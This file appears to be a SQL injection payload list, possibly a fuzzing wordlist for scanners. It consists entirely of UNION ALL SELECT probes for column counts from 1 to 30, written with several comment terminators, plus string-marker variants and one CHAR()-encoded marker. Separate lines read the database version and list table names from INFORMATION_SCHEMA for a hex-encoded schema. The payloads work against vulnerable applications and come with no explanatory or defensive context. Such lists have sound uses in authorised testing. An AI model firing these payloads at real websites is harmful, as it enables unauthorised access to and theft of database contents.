+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+'+UNION+ALL+SELECT+1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x636f70616c7075626c697368696e675f636f70616c),4,5,6,7,8,9,10,11,12,13,14,15 -- -
+' UNION ALL SELECT 1, @@version;#
+ UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
+UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX'
+UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
